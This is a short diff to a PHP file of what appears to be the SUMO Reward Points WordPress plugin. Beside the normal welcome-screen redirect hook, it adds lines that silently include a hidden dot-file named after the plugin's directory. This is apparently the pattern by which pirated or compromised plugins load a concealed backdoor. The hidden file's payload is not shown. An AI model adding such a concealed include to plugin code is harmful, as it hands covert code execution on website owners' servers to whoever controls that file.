@@ -1,6 +1,10 @@
 <?php
 add_action('admin_init', 'sumo_reward_points_welcome_screen_do_activation_redirect');
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function sumo_reward_points_welcome_screen_do_activation_redirect() {
     if (!get_transient('_welcome_screen_activation_redirect_reward_points')) {
         return;
